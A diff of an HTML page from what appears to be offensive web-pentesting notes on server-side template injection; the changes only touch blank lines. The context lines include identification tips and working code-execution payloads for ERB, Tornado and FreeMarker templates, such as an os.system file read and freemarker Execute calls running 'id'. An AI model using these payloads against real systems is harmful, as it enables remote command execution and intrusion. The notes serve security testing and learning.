@@ -32,7 +32,6 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>GENERAL INFORMATION</summary>
-
 first clue is XSS, normally after finding XSS no deep testing is performed and sometimes missed during black box engagements.
 one good way to differentiate if SSTI is possible is to attempt normal/common operations, like sum, multiplication, etc.
 
@@ -47,7 +46,6 @@ session files, or /proc/self/env
 </details>	
 <details>
 <summary>IDENTIFICATION</summary>
-
 1. detecting template injection
 
 initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, 
@@ -76,7 +74,6 @@ check this site, https://portswigger.net/web-security/server-side-template-injec
 </details>	
 <details>
 <summary>TEMPLATES ENGINES</summary>
-
 <b> >> ERB</b>
 
 it is pretty important to check the documentation, there you can find the different methods or functions that you can call to make the 
@@ -98,7 +95,7 @@ you can mix commands to get the desired results, importing the OS module bring t
 {% import os %}{{os.system('cat /home/user/mo.txt')	
 
 <b> >> FREEMARKER</b>
-
+	
 <b>code execution:</b> 
 
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
@@ -108,7 +105,6 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
 	
 </details>
-	
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
